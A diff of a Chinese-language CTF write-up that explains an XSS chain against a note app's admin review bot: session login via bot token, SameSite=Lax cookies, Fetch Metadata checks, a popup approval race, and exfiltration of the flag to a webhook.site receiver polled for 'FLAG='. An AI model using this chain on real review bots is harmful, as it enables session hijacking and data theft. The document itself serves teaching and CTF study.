@@ -366,6 +366,8 @@ app.get("/note/:id", (req, res) => {
 2. **S2 脚本**：同样处理，`https://httpbin.org/base64/<S2 的 base64>` 就是它的公网地址（供审查界面的沙箱以 `<script src>` 加载，加载过程在 2.9；也就是 `window.open` 的 `u=` 参数要带的地址；完整链接见附录 D）；
 3. **接收端**：`POST https://webhook.site/token` 建一个免费 token（响应 JSON 里的 `uuid` 就是地址后缀），得到的 `https://webhook.site/{uuid}` 用来收 XSS 外传的 flag；提交给 `/report` 的网址就是 stage1 的 httpbin 地址（带 `?note=<编号>`）。
 
+**查看接收情况**：浏览器打开 `https://webhook.site/#!/{uuid}` 看实时请求列表（每条请求的 URL、请求头、查询串都有）；或用 API 轮询 `GET https://webhook.site/token/{uuid}/requests?sorting=newest`，返回的 JSON 里列出全部请求，从请求 URL 里找 `FLAG=`（攻击脚本就是这样每几秒轮询一次）。本地复现不需要这套：attacker.js 的 `/f` 路由直接在终端打印。
+
 两个坑（不绕开会直接断链，当时的做法都做了规避）：
 
 - **webhook.site 免费版的响应带 CSP `script-src 'none'`**：后果：放它上面的页面被直接打开时内部脚本不执行（机器人打开后不会有任何动作）。规避：stage1 这类"页面自己跑代码"的内容放 httpbin（无 CSP）；被挑战域以 `<script src>` 加载的脚本则两种载体都可以（加载方式不受目标响应 CSP 影响，CSP 只约束文档自身）。
@@ -447,7 +449,7 @@ report_url = "https://httpbin.org/base64/" + base64.b64encode(stage1_html.encode
 
 #### 2.5.3 提交审查
 
-> 向 /report 接口提交审查。
+> 向 /report 接口提交审查，这是一个API接口，它会调用机器人（bot）做审查。
 
 提交的表单只有一个字段：`url`（首页表单是 `<input name="url">`，见 `src/views/index.ejs`），它的值是一个网址；服务器只校验它是合法的 http/https 地址（源码里 `new URL(...)` 加协议检查），**域不受限制**。本主线提交的网址是上面刚运行起来的 stage1 页面：
 
@@ -457,10 +459,10 @@ http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507
    机器人最后会整页打开这个地址                   给 POST /report 读的
 ```
 
-两部分说明：
+**逻辑概览（详见下面根据源码详解）：**
 
-- **路径部分 `/stage1`**：机器人最终打开的页面（它上面会执行我们准备的 JS；页面内容即前置块的代码）。机器人打开它时，服务器会自动在网址后追加 `&rid=<id>`（见下文"数据的去向"）。
-- **查询参数 `?note=<编号>`**：`POST /report` 读它，决定审查页的**渲染分支**要输出哪篇笔记（机制见 2.6）；值是前面创建的笔记编号（`c350151803f0f8f3d507`）。编号的来源只有一个：创建笔记时由服务器生成、经 2.3 的 `Location` 头带回；读取动作见下面处理代码里的 `searchParams.get("note")` 一行。
+- **路径部分 `/stage1`**：机器人最终打开的页面。这个页面返回的内容就是 2.5.2 里 attacker.js 的 `/stage1` 路由拼出的 HTML，里面是两段攻击者脚本：第一段弹窗打开审查界面，第二段主页面连续自导航。机器人打开它时，服务器会自动在网址后追加 `&rid=<id>`（见下文"数据的去向"）。
+- **查询参数 `?note=<编号>`**：`POST /report` 读它，决定审查页（`/reports/check`）的**渲染分支**要输出哪篇笔记（机制见 2.6），审查页由机器人调用，note的编号是前面创建的笔记编号（`c350151803f0f8f3d507`）。编号的来源只有一个：创建笔记时由服务器生成、经 2.3 的 `Location` 头带回；读取动作见下面处理代码里的 `searchParams.get("note")` 一行。
 
 两种提交方式（效果相同）：
 
@@ -491,11 +493,16 @@ app.post("/report", async (req, res) => {
   try { target = new URL(String(req.body.url || "")); } catch { ... }  // 解析提交的网址
   const noteId = String(target.searchParams.get("note") || "");        // 从网址里取笔记编号
 
-  const id = randomId(12);                             // 本轮审查编号：进入 URL 后叫 rid
+  const id = randomId(12);                              // 本轮审查编号：进入 URL 后叫 rid
   currentReview = {                                     // 创建本轮审查记录
-    id, url: target.href, noteId,                     // url=提交的网址原样保存；noteId=上面取出的笔记编号
+    id, url: target.href, noteId,                       // url=提交的网址原样保存；noteId=上面取出的笔记编号
+    // 下面四个布尔值记录本轮审查的进度（初始全部为 false）：
+    //   visited：审查页是否已被访问过（首访置 true：只留标记、发 view cookie；二访才进渲染分支）
+    //   prepared：机器人是否已就位（机器人调用就绪接口时置 true，表示它准备好打开提交的网址）
+    //   approved：审查是否已批准（审查界面调用 /complete、通过四项检查时置 true；渲染分支必查）
+    //   used：本轮笔记是否已被渲染消费（渲染一次后置 true，防止同一轮审查被重复渲染）
     prepared: false, approved: false, used: false, visited: false,
-    nonce: randomId(16), flag: null,                  // nonce：进入 URL 后叫 state；flag：机器人访问 /api/flag 时写入
+    nonce: randomId(16), flag: null,                    // nonce：进入 URL 后叫 state；flag：机器人访问 /api/flag 时写入
   };
 
   try {
@@ -511,20 +518,31 @@ app.post("/report", async (req, res) => {
 
 **补充：这些数据的去向**
 
-1. **外来输入两样**：`url`（你提交的网址，机器人最终要打开它）和 `noteId`（从提交网址的 `?note=` 取出；渲染分支输出哪篇笔记由它决定，渲染分支见 2.6）。
+1. **外来输入两样**：
+  1. `url`：你提交的网址，机器人要打开它做审查。
+  2. `noteId`：从提交网址的 `?note=` 取出。审查页（`/reports/check`）里面的渲染分支（currentReview.visited 等于 true 的时候）决定渲染哪篇笔记，渲染分支见 2.6。
 2. **本轮新造两样**：
-   - **审查编号**（代码字段 `id`，进入 URL 后叫 `rid`）：出现在三处：审查页地址 `/reports/check?rid=<id>&state=<nonce>`（审查页见 2.6）；就绪接口路径 `/reports/arm/<id>`（就绪接口机制见本节下文）；机器人打开 `url`（表单里提交的 stage1 网址）时自动追加的 `&rid=<id>`。最后这一处是**页面导航**（打开攻击者页面），不是接口调用；最终地址形如 `http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=<id>`，下面日志里 `stage1?note=…&rid=…` 那一行就是它。
-   - **`nonce`**（一次性秘密核对串；进入 URL 后叫 `state`）：出现在两处：审查页地址的 `state` 参数；`/complete` 接口的请求里（该接口只由攻击链触发，机制见 3.2）。请求带上正确的它，服务器才按"本轮审查的合法请求"处理；攻击者拿不到它，无法伪造这类请求（渲染分支会核对它，见 2.6）。
-3. **装载与寿命**：全部装进 `currentReview`，只存在于本次 `/report` 的处理期间（处理函数要等 `await review(...)` 跑完才渲染响应，客户端因此一直挂起；响应发出后记录即清空）。两个后果：同一时间只能跑一轮审查（重复提交得 429）；攻击链必须在机器人的 10 秒停留内完成（时序表见 2.12）。
+   1. **审查编号**（代码字段 `id`，进入 URL 后叫 `rid`），出现在三处：
+    - 审查页地址 `/reports/check?rid=<id>&state=<nonce>`（审查页见 2.6）。
+    - 就绪接口路径 `/reports/arm/<id>`（就绪接口机制见本节下文）；机器人打开 `url`（表单里提交的 stage1 网址）时自动追加的 `&rid=<id>`。
+    - 最后这一处是**页面导航**（打开攻击者页面），不是接口调用；最终地址形如 `http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=<id>`，下面日志里 `stage1?note=…&rid=…` 那一行就是它。
+   2. **`nonce`**，它是一次性秘密核对串，进入 URL 后叫 `state`。攻击者拿不到它，无法伪造这类请求。nonce 出现在两处：
+    - 审查页地址的 `state` 参数，渲染分支会核对它，见 2.6。
+    - `/complete` 接口的请求里，该接口只由攻击链触发，机制见 3.2。请求带上正确的它，服务器才按"本轮审查的合法请求"处理。
+3. **装载与寿命**：审查数据全部装进服务端的 `currentReview` 对象中，它只存在于本次 `/report` 的处理期间（处理函数要等 `await review(...)` 跑完才渲染响应，客户端因此一直挂起；响应发出后它设置为null）。当前的代码逻辑意味着：同一时间只能跑一轮审查（重复提交得 429）；攻击链必须在机器人的 10 秒停留内完成（时序表见 2.12）。
 
-**`review()` 里机器人做事的发生顺序**（函数体在 `bot/bot.js`，节选）：
+
+**`review()` 函数调用了机器人，它的做事顺序**（函数体在 `bot/bot.js`，节选）：
 
 ```js
 const context = await browser.createBrowserContext();   // 新建浏览器上下文：cookie 的存储单元，生命周期独立于页面（同上下文的页面共享 cookie）
-// 1. 用令牌把会话升级为管理员（cookie 留在 context 里）
+
+// 1. 用令牌登录管理员（cookie 留在 context 里）：相当于走一遍模拟登录接口。
+//    登录接口与目标页面在同一个站（本题都在 localhost:3000）：先向登录接口认证，之后访问目标页面就能通过鉴权。
+//    登录后服务器下发会话 cookie（一般是会话 ID，身份数据存在服务器端；也可能是 token 本身）；后续请求自动带上它，服务器校验通过后按对应身份放行。
 const sessionPage = await context.newPage();
 await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });   // ① 给请求附加请求头 X-Bot-Token（不是 cookie；服务器凭这个头认证机器人）
-await sessionPage.goto(`${APP_URL}/reports/session`);                  // ② 访问升级接口（成功时响应带 Set-Cookie: sid=...，此后由浏览器自动携带）
+await sessionPage.goto(`${APP_URL}/reports/session`);                  // ② 访问登录接口（成功时响应带 Set-Cookie: sid=...，此后由浏览器自动携带）
 await sessionPage.close();                              // 关闭页面；cookie 仍留在 context 里（sid 的生效范围=设置它的主机+路径 /），后续同上下文页面自动携带
 
 // 2. 主页面按固定顺序做四步
@@ -542,16 +560,25 @@ const hookPage = (pg, tag) => {
 };
 hookPage(page, "main");                                 // 调用：日志里的 [bot-*:main] 行从这行开始生效
 
-await page.goto(`${APP_URL}/reports/check?rid=${report.id}&state=${report.nonce}`);   // 访问审查页（rid、state 即上面生成的两个值）
+// 访问审查页（rid、state 即上面生成的两个值），设置 visited 为 true，响应的时候告诉浏览器把 审查编号（rid） 设置到 cookie，详细讲解在节2.6
+await page.goto(`${APP_URL}/reports/check?rid=${report.id}&state=${report.nonce}`);
 await page.goto(`${APP_URL}/api/flag`);                    // flag 载入内存
 await fetch(`${APP_URL}/reports/arm/${report.id}`, ...);   // 调用就绪接口：置 prepared（程序直接发请求，不经浏览器）
-await page.goto(url);                                      // url 是你提交的，bot 会附加 rid 参数
+
+// 打开你提交的需要审查的 url，url里面附加 rid 参数
+const url = new URL(report.url);
+url.searchParams.set("rid", report.id);
+await page.goto(url.href, {
+  waitUntil: "domcontentloaded",
+  timeout: 7000,
+});
+
 await sleep(10000);                                        // 停留 10 秒
 ```
 
-**会话升级的机制（`/reports/session`）**
+**管理员登录的机制（`/reports/session`）**
 
-一句话总结：机器人用口令向 `/reports/session` 换取一个管理员会话：服务器把该浏览器的会话数据标记为 `admin: true`；此后这个浏览器的每个请求都自动带会话 ID，服务器凭它查出数据、判断是否为管理员，再决定放行还是拒绝。细节分三步：会话怎么存、升级怎么发生、会话怎么被后续请求使用。
+一句话总结：机器人用口令向 `/reports/session` 换取一个管理员会话：服务器把该浏览器的会话数据标记为 `admin: true`；此后这个浏览器的每个请求都自动带会话 ID，服务器凭它查出数据、判断是否为管理员，再决定放行还是拒绝。细节分三步：会话怎么存、登录怎么发生、会话怎么被后续请求使用。
 
 服务器用 `express-session` 库管理会话，工作方式分两部分：**服务器端存会话数据**。本题用 MemoryStore，即服务器进程内存里的一个键值表：键是随机的**会话 ID**，值是这份会话的数据（比如 `{ name: "reviewer", admin: true }`）。**浏览器端只拿会话 ID**，它存在 cookie `sid` 里。这个 cookie 带两个属性：`HttpOnly`（网页脚本无法读取它，它只能随请求自动发送）和 `SameSite=Lax`。此后浏览器每次请求都带上这个 ID，服务器凭它在存储里查出对应的数据，就知道这个请求属于哪个会话、是不是管理员。
 
@@ -559,7 +586,7 @@ await sleep(10000);                                        // 停留 10 秒
 
 新建与复用：中间件处理每个请求时先看 cookie。请求带 `sid`（且 store 里有对应数据）时复用那份会话；没有 `sid` 时新建一份会话、生成新 ID，并通过响应头 `Set-Cookie: sid=...` 下发给浏览器。机器人那次访问 `/reports/session` 属于后者（它的浏览器上下文此前没有 `sid`），所以是"新建会话并拿到 `sid`"。
 
-默认情况下谁都没有管理员身份（代码里叫 `admin`）；唯一的升级方式是：
+默认情况下谁都没有管理员身份（代码里叫 `admin`）；唯一的登录方式是：
 
 ```js
 app.get("/reports/session", (req, res) => {
@@ -571,9 +598,9 @@ app.get("/reports/session", (req, res) => {
 });
 ```
 
-请求头里带上正确的机器人令牌（部署时配置的环境变量 `BOT_TOKEN`），这个会话就变成管理员。两段代码的对应关系：① 与 ② 是机器人端给请求带上令牌后请求服务端；③ 与 ④ 是服务器端的令牌校验和标记管理员：一次请求、一次比较、一次写入。机器人程序启动后第一件事就是访问这个接口，用令牌把自己的会话升级成管理员权限。攻击者不知道这个令牌（它由部署时的环境变量 `BOT_TOKEN` 配置），但**机器人升级好的会话会留在机器人的浏览器里**，本质是会话升级和后面的goto访问后端接口用的都是同一个`context`对象，所以后面所有页面都带着它。
+请求头里带上正确的机器人令牌（部署时配置的环境变量 `BOT_TOKEN`），这个会话就变成管理员。两段代码的对应关系：① 与 ② 是机器人端给请求带上令牌后请求服务端；③ 与 ④ 是服务器端的令牌校验和标记管理员：一次请求、一次比较、一次写入。机器人程序启动后第一件事就是访问这个接口，用令牌登录，获得管理员权限。攻击者不知道这个令牌（它由部署时的环境变量 `BOT_TOKEN` 配置），但**机器人登录后的会话会留在机器人的浏览器里**：本质是登录和后面的 goto 访问后端接口用的都是同一个 `context` 对象，所以后面所有页面都带着它。
 
-这个值的强度还决定一条捷径是否存在：如果它被猜到或泄漏（例如沿用了源码里的默认值 `dev-token`），攻击者可以直接带 `X-Bot-Token` 请求 `/reports/session` 把自己的会话升级成管理员，随后在任意一轮审查进行期间直接读 `/api/flag`，本文其余的链全部可以跳过。因此部署要求强随机值（远程实例即如此）。本地复现的配置里，`BOT_TOKEN` 写的是明文测试值 `local-bot-token`（注意这里的"测试值"指机器人口令，不是 flag；flag 在本地是 compose 里配置的占位字符串，由攻击链按与远程相同的方式读走）。攻击链按"攻击者不知道令牌"构造：拿 flag 的完整链（弹窗批准、历史回退、渲染 XSS）不涉及这个值；复现脚本里唯一用到它的一步是调试残留（给脚本自己的浏览器升级会话，与拿 flag 无关），实测把该步骤去掉后完整链照样成功取得 flag。
+这个值的强度还决定一条捷径是否存在：如果它被猜到或泄漏（例如沿用了源码里的默认值 `dev-token`），攻击者可以直接带 `X-Bot-Token` 请求 `/reports/session`，以管理员身份登录，随后在任意一轮审查进行期间直接读 `/api/flag`，本文其余的链全部可以跳过。因此部署要求强随机值（远程实例即如此）。本地复现的配置里，`BOT_TOKEN` 写的是明文测试值 `local-bot-token`（注意这里的"测试值"指机器人口令，不是 flag；flag 在本地是 compose 里配置的占位字符串，由攻击链按与远程相同的方式读走）。攻击链按"攻击者不知道令牌"构造：拿 flag 的完整链（弹窗批准、历史回退、渲染 XSS）不涉及这个值；复现脚本里唯一用到它的一步是调试残留（给脚本自己的浏览器登录，与拿 flag 无关），实测把该步骤去掉后完整链照样成功取得 flag。
 
 `SameSite=Lax` 这条属性很关键，它规定：**跨站请求默认不带 cookie，但顶层导航（打开新页面）例外**。也就是说，攻击者网页里用 `fetch` 直接请求挑战域的 `/api/flag` 是带不上 cookie 的；但用 `window.open`、`location.href` 跳到挑战域的地址，cookie 会带上。
 
@@ -591,7 +618,7 @@ app.post("/reports/arm/:id", requireBot, (req, res) => {   // requireBot是一�
 });
 ```
 
-所以从点 Send 到收到响应的耗时 ≈ 浏览器准备时间（耗时极短）+ 主页面四个访问动作的前三项耗时（耗时极短）+ **固定停留 10 秒** + 收尾。后面攻击链能利用的时间窗，正是这段停留期。
+> 所以从点 Send 到收到响应的耗时 ≈ 浏览器准备时间（耗时极短）+ 主页面四个访问动作的前三项耗时（耗时极短）+ **固定停留 10 秒** + 收尾。后面攻击链能利用的时间窗，正是这段停留期。
 
 #### 2.5.4 实际执行
 
@@ -647,21 +674,26 @@ Keep-Alive: timeout=5
 
 这些行在**服务器进程**里输出（`docker logs` 可见），但记录的内容是"主页面"的事件。"主页面"的定义：bot.js 用 `context.newPage()` 新建、承载四个访问动作的那个页面（即上面代码块里 `const page` 的那一行；它和用完即关的 `sessionPage` 是两个不同页面）。bot.js 给这个页面挂了事件钩子（`hookPage(page, "main")`），钩子把该页面的请求、导航、console 逐条打印出来（原始附件没有这些代码，是本地复现时加的插桩，第六章有观察方法）。
 
-日志只包含主页面上的动作，因此以下两处不会出现在日志里：会话升级在另一个临时页面（`sessionPage`）上完成；就绪接口是进程内的 `fetch`，不属于任何页面。这两步下面流程表会补全。
+日志只包含主页面上的动作，因此以下两处不会出现在日志里：登录在另一个临时页面（`sessionPage`）上完成；就绪接口是进程内的 `fetch`，不属于任何页面。这两步下面流程表会补全。
 
 `rid`、`state` 是上面处理代码里生成的两串值（`id` 与 `nonce`）进入 URL 后的名字；`secSite`、`secDest` 是服务器打印的请求头取值，用途见 2.6 检查 4。日志内容：
 
 ```text
-[bot-req:main] GET http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c
-[check-debug] rid=0802aeb8 admin=true secSite=none secDest=document visited=false
-[bot-frame-nav:main] http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c
-[bot-req:main] GET http://localhost:3000/api/flag
-[bot-frame-nav:main] http://localhost:3000/api/flag
-[bot-req:main] GET http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3
-[bot-frame-nav:main] http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3
+# 组 1：机器人访问审查页（首访）
+[bot-req:main] GET http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c   ← bot.js 的 request 钩子：主页面发起这次请求的那一瞬间
+[check-debug] rid=0802aeb8 admin=true secSite=none secDest=document visited=false   ← server.js 打印（来源与上下两条不同）：服务器收到该请求、进入 /reports/check 处理时
+[bot-frame-nav:main] http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c   ← bot.js 的 framenavigated 钩子：这次导航完成时（组 1 结束）
+
+# 组 2：机器人读取 flag
+[bot-req:main] GET http://localhost:3000/api/flag   ← 发起请求时
+[bot-frame-nav:main] http://localhost:3000/api/flag   ← 导航完成时（JSON 接口是整页打开，同样有这两条）
+
+# 组 3：机器人打开提交的网址（stage1）
+[bot-req:main] GET http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3   ← 发起请求时
+[bot-frame-nav:main] http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3   ← 导航完成时（从这里开始机器人停留 10 秒）
 ```
 
-（后续：沙箱加载、批准、挤出、第二次访问、外传，全部发生在同一个 10 秒窗口内，逐段见 2.9 起各节与第五章的脚本。）
+> 后续：沙箱加载、批准、挤出、第二次访问、外传，全部发生在同一个 10 秒窗口内，逐段见 2.9 起各节与第五章的脚本。
 
 #### 2.5.5 从创建笔记到机器人收工梳理
 
@@ -672,12 +704,12 @@ Keep-Alive: timeout=5
 | 1 | 你的浏览器 | 创建笔记 | `POST /create`（表单字段 `title`、`html`） | `const id = randomId(10)` 生成编号；响应 `Location: /note/<编号>`（详见 2.2、2.3 节） |
 | 2 | 你的浏览器 | 打开预览页 | `GET /note/:id`（路径参数 `req.params.id`） | 预览页不读查询参数：`note` 加在这里也会被忽略；预览路由只按路径参数 `req.params.id` 取数 |
 | 3 | 你的浏览器 | 提交审查（点 Send） | `POST /report`（请求体字段 `url`，其中含 `?note=<编号>`） | 服务器取出 `target.searchParams.get("note")`，存成 `currentReview.noteId`；页面从此挂起（note 的用途见本节前文） |
-| 4 | 机器人浏览器 | 准备：把会话升级为管理员 | `GET /reports/session`（请求头 `X-Bot-Token: <机器人口令>`） | 服务器执行 `req.session.admin = true`（把该会话的数据改为管理员）；会话 ID 的 cookie 留在机器人浏览器里，后续请求自动带上（会话机制见本节前文） |
+| 4 | 机器人浏览器 | 准备：登录管理员 | `GET /reports/session`（请求头 `X-Bot-Token: <机器人口令>`） | 服务器执行 `req.session.admin = true`（把该会话的数据改为管理员）；会话 ID 的 cookie 留在机器人浏览器里，后续请求自动带上（会话机制见本节前文） |
 | 5 | 机器人浏览器 | 访问审查页 | `GET /reports/check?rid=&state=` | 首访只标记 `visited=true`、发放 view cookie、返回占位页。**渲染发生在二访**：那时用 `notes.get(currentReview.noteId)` 取回第 1 行的笔记，交给 `review-document` 模板输出（2.6 详讲两个分支） |
-| 6 | 机器人浏览器 | 访问 flag 接口 | `GET /api/flag` | 一个 JSON 接口，被机器人"整页打开"；flag 写进 `currentReview.flag`（2.11 讲它的用法） |
+| 6 | 机器人浏览器 | 访问 flag 接口 | `GET /api/flag` | 一个 JSON 接口，被机器人"整页打开"（顶层导航会把 JSON 响应也当文档加载：显示为一行 JSON 文本，不解析 HTML、不执行脚本；机器人只需这次请求发生）；flag 写进 `currentReview.flag`（2.11 讲它的用法） |
 | 7 | **服务器进程内的 fetch**（JavaScript 发 HTTP 请求的内置函数） | 调用就绪接口 | `POST /reports/arm/:id`（请求头 `X-Bot-Token`） | 置 `prepared=true`；这一步不经浏览器（机制见本节前文） |
-| 8 | 机器人浏览器 | 打开提交的网址（stage1） | `GET http://host.docker.internal:9975/stage1?note=<编号>&rid=<rid>` | 机器人自动追加 `&rid=`；打开后停留 10 秒（它的两段动作分别在 2.9 与 2.10 分解） |
-| 9 | 你的浏览器 | 收到响应 | （无） | 显示 "The reviewer finished." |
+| 8 | 机器人浏览器 | 打开提交的网址（stage1） | `GET http://host.docker.internal:9975/stage1?note=<编号>&rid=<rid>` | **这个请求落到你的攻击者服务器**（attacker.js 的 `/stage1` 路由接收并返回页面）；机器人自动追加 `&rid=`；打开后停留 10 秒（它的两段动作分别在 2.9 与 2.10 分解） |
+| 9 | 你的浏览器 | 收到响应（第 3 行 `POST /report` 的响应，等到机器人跑完第 4~8 行才返回） | （无） | 页面解除挂起，显示 "The reviewer finished." |
 
 第 3 到第 8 行是同一轮审查的时间线：你的浏览器只参与第 1、2、3、9 行；第 4 到第 8 行全部发生在服务器内部拉起的无头 Chromium 里（第 7 行甚至不经浏览器），所以你在自己的浏览器和网络面板里看不到它们。
 
@@ -685,9 +717,9 @@ Keep-Alive: timeout=5
 
 ### 2.6 审查页的两次访问
 
-这一节无法通过你的浏览器打开网页并操作：用你的浏览器直接打开审查页地址只会得到 403，因为你的浏览器没有管理员身份（`admin` 会话是第一道检查，也正是整条攻击链要"借"的东西）。下面用 curl 模拟不同身份的访问者。
+> 一句话机制：这一页要被访问两次才完整：第一次只做标记 visited 并返回占位页，第二次通过全部检查后渲染笔记原文。机器人自己只访问第一次；第二次是攻击链要制造的。
 
-一句话机制：这一页要被访问两次才完整：第一次只做标记并返回占位页，第二次通过全部检查后渲染笔记原文。机器人自己只访问第一次；第二次是攻击链要制造的。
+**这一节无法通过你的浏览器打开网页并操作**：用你的浏览器直接打开审查页地址只会得到 403，因为你的浏览器没有管理员身份（`admin` 身份是第一道检查，也正是整条攻击链要"借"的东西）。下面用 curl 模拟不同身份的访问者。
 
 审查页 `/reports/check` 是本题最核心的路由。源码的流程由一条 `if (currentReview.visited)` 分成两段，下文分别称为**渲染分支**（条件成立时执行：渲染笔记原文）和**标记分支**（条件不成立时执行：标记已访问、下发 `view` cookie、返回占位页）。这两个名字是本文对两段代码的称呼，源码中并没有它们。完整源码如下（`src/server.js`，注释标出了每项检查对应的代码）：
 
@@ -714,8 +746,8 @@ app.get("/reports/check", (req, res) => {
       return;
     }
 
-    if (!policy(req) || !consumeReport(req)) {                        // 检查 4 + 检查 5 到 8
-      res.status(403).type("text/plain").send("forbidden");
+    if (!policy(req) || !consumeReport(req)) {                        // 检查 4 + 检查 5 到 8，
+      res.status(403).type("text/plain").send("forbidden");           // 目标存在但不允许
       return;
     }
 
@@ -733,11 +765,11 @@ app.get("/reports/check", (req, res) => {
 检查 4 到 8 展开在两个辅助函数里：
 
 ```js
-function policy(req) {                              // 检查 4：Fetch Metadata
+function policy(req) {                              // 检查 4：Fetch Metadata（浏览器自动附加、脚本无法伪造的一组 Sec-Fetch-* 头）
   return Object.entries({
-    "sec-fetch-site": "none",
-    "sec-fetch-dest": "document",
-  }).every(([header, expected]) => req.get(header) === expected);
+    "sec-fetch-site": "none",                       // 要求"无站点来源"：请求由浏览器 UI 直接发起（地址栏、书签、外部打开、回退/前进都属于这种；页面内点击的链接会带来源、不通过）
+    "sec-fetch-dest": "document",                   // 要求目标是"加载文档"且是顶层导航请求；iframe 里打开网页的取值是 iframe（图片/脚本/fetch 等子资源各有其值），都不满足这一条
+  }).every(([header, expected]) => req.get(header) === expected);   // 两项都完全一致才返回 true：请求没有页面来源（none 的原义）、且目标是顶层文档导航（通过地址栏、书签、外部应用打开、手动或JS操作的回退/前进都属于这类）
 }
 
 function consumeReport(req) {
@@ -747,10 +779,10 @@ function consumeReport(req) {
   if (
     !currentReview
     || currentReview.id !== id        // 再次确认 rid 与当前审查一致
-    || state !== currentReview.nonce  // 检查 5：state 匹配
-    || !currentReview.prepared        // 检查 6：机器人已就位
-    || !currentReview.approved        // 检查 7：审查已批准
-    || currentReview.used             // 检查 8：未被使用过
+    || state !== currentReview.nonce  // 检查 5：state 必须匹配
+    || !currentReview.prepared        // 检查 6：机器人不能未就位
+    || !currentReview.approved        // 检查 7：审查不能未批准
+    || currentReview.used             // 检查 8：笔记不能已经被渲染过
   ) {
     return false;
   }
@@ -760,17 +792,16 @@ function consumeReport(req) {
 }
 ```
 
-对这段源码的三点补充：
+对这段源码的补充：
 
-1. **执行顺序**：检查 1、2 在路由开头，任何请求都要先过；之后按 `visited` 分流。渲染分支里检查 4 与 5 到 8 写在同一条 `if` 里，`||` 短路求值：`policy` 不满足就直接 403，不再执行 `consumeReport`；`consumeReport` 内部同样是逐项短路。
-2. **404 与 403 的分工**：编号对不上（检查 2）、笔记不存在（检查 3）返回 404（"目标不存在"）；身份或条件不满足（检查 1、4 到 8）返回 403（"目标存在但不允许"）。这也是给攻击者的信号：404 说明 rid 不对，403 说明 rid 对了但后面某项没满足。
-3. **`used` 与其它检查的性质不同**：其它检查只读取状态；`used` 在通过后会被立即置为 true（`consumeReport` 里 `return true` 之前），作用是同一轮审查的渲染只能发生一次。
+1. **404 与 403 的分工**：404 说明审查编号（rid）不对，403 说明 rid 对了但后面某项没满足。
+2. **`used` 与其它检查的性质不同**：其它检查只读取状态；`used` 在通过后会被立即置为 true（`consumeReport` 里 `return true` 之前），作用是同一轮审查的渲染只能发生一次。
 
 **第一次访问（标记分支）**
 
 - 返回一个占位页，同时设置 `view` cookie、把 `visited` 置为 true。两个数据的存放位置与作用都不同：
   - `visited` 是**服务器端**字段（`currentReview` 对象的属性，存在服务器进程内存里），它决定第二次访问走哪个分支；
-  - `view` cookie 存在浏览器里（首次访问的响应设置它）；它的作用和两个机制在 2.7 讲。
+  - `view` cookie 存在浏览器里（首次访问的**响应设置它**）；它的作用和两个机制在 2.7 讲。
 
 **第二次访问（渲染分支）**
 
@@ -926,21 +957,21 @@ HTTP 标准规定：响应里出现 `Vary` 时，缓存模块保存这条响应�
 
 ### 2.9 批准：弹窗与 pagehide 竞态
 
-2.5 停在这里：机器人打开了 stage1（该轮日志的最后一行），并开始 10 秒停留。stage1 页面里的第一段 JS 立即执行（见 2.5 前置块的代码）：弹窗打开审查界面；第二段 3.5 秒后才开始（2.10 讲）。本节按顺序：弹窗 → 沙箱加载 → pagehide 竞态 → `/complete`。
+2.5 停在这里：机器人打开了 stage1（该轮日志的最后一行），并开始 10 秒停留。stage1 页面里的第一段 JS 立即执行（就是 2.5.2 里 attacker.js 的 `/stage1` 路由拼出的页面）：弹窗打开审查界面；第二段 3.5 秒后才开始（2.10 讲）。本节按顺序：弹窗 → 沙箱加载 → pagehide 竞态 → `/complete`。
 
 先说清为什么弹窗是关键：stage1 运行在攻击者的源（例如 `http://host.docker.internal:9975`），**不是挑战域**。它不能直接 `fetch("http://localhost:3000/api/flag")`，因为跨站请求不带 `SameSite=Lax` 的 cookie，服务器会返回 403；直接 `fetch` 审查界面也不行（同类问题）。
 
 突破点是 Lax 的例外规则：**顶层导航会携带 cookie**。于是 stage1 里执行：
 
-（下面这段是示意，实际代码即 2.5 前置块里 stage1 页面的第一段 JS。）
+（下面这段是示意，实际代码即 2.5.2 里 attacker.js 的 `/stage1` 路由里拼出的第一段 JS。）
 
 ```js
 const rid = new URLSearchParams(location.search).get("rid");   // 机器人追加的 rid
-// 攻击脚本地址形如 http://host.docker.internal:9975/s2p.js（2.4 前置块里 S2 的下发地址）
+// 攻击脚本地址形如 http://host.docker.internal:9975/s2p.js（2.5.2 里 attacker.js 的 /s2p.js 路由）
 window.open("http://localhost:3000/review?u=" + 攻击脚本地址 + "&rid=" + rid, "REV");
 ```
 
-这个弹窗是一次顶层导航，机器人浏览器会带上自己的管理员 cookie，请求到达挑战域时身份就是管理员。`/review` 的两项检查（admin、rid 匹配）同时满足，审查界面成功打开，攻击脚本地址（即 2.5 前置块里的 `/s2p.js`）被登记为待审查文档。
+这个弹窗是一次顶层导航，机器人浏览器会带上自己的管理员 cookie，请求到达挑战域时身份就是管理员。`/review` 的两项检查（admin、rid 匹配）同时满足，审查界面成功打开，攻击脚本地址（即 2.5.2 里 attacker.js 的 `/s2p.js` 路由）被登记为待审查文档。
 
 审查界面打开后，其中的沙箱 iframe（带 `sandbox` 属性限制的嵌入子页面：允许执行脚本，但不给它任何同源权限）会加载 `/sandbox?rid=...`，服务器用带 nonce 的 script 标签加载攻击脚本。至此，攻击脚本在审查页面内部的沙箱 iframe 里开始运行。
 
@@ -1024,7 +1055,7 @@ REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
 
